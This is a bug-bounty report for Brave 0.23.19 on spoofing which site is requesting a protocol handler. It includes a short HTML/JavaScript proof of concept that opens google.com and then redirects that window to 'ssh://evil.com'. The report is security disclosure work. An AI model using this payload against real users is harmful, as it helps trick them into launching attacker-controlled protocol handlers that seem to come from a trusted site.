# Spoof protocol handler requester

> Severity:      Medium
> Link:          https://hackerone.com/reports/374969
> Date:          2018-07-01 13:22:11 +0000

## Summary

Navigation to protocol handler URL from the page opened using `window.open` is considered as a request from the opened page.

Example:

1. The page opens `google.com`
2. The page changes opened window's location to `ssh://evil.com`
3. Request to open `ssh://evil.com` URL displayed at `google.com`

**Combining this vulnerability with #369185 makes the attack scenario in #369218 more available.**

## Products affected

Brave: 0.23.19

## Steps To Reproduce

PoC:

``` html
<script>
    window.onclick = () => {
        w = window.open("https://google.com")
        setTimeout(() => {
            t = w.location.replace('ssh://evil.com');
        }, 1000)
    }
</script>
```

## Supporting Material/References:

Screencast + PoC attached.

## Impact

An attacker could trick a user to open protocol handler from a trusted site.
